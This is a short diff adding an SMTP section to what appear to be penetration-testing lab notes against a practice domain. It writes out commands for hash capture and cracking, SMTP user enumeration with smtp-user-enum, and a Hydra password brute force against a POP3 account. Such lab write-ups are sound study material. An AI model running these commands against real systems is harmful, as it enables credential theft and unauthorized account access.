@@ -37,3 +37,16 @@ sudo responder -I tun0
 hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
 ```
 
+# SMTP 
+
+I used smtp-user-enum in RCPT mode:
+```
+smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t 10.129.203.12
+```
+
+Since POP3 was open, I performed a password brute force attack using Hydra:
+
+```
+hydra -l 'marlin@inlanefreight.htb' -P passwords.list -f 10.129.203.12 pop3
+```
+
